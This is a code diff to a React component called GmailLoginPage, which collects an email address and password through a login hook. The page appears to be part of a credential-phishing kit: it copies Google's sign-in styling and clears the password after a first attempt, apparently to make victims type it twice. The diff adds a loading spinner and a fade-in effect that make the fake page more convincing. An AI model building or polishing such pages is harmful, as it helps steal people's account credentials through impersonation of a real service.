@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 
@@ -39,8 +39,14 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [pageReady, setPageReady] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
+
+  useEffect(() => {
+    const timer = setTimeout(() => setPageReady(true), 100);
+    return () => clearTimeout(timer);
+  }, []);
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
@@ -52,8 +58,16 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     if (result?.isFirstAttempt) { setPassword(''); }
   };
 
+  if (!pageReady) {
+    return (
+      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center">
+        <Spinner size="lg" color="border-blue-600" />
+      </div>
+    );
+  }
+
   return (
-    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
+    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       <main className="flex-grow w-full flex items-center justify-center p-4">
         <div 
           className="w-full max-w-lg mx-auto py-10 px-6 md:px-12 bg-white rounded-2xl"
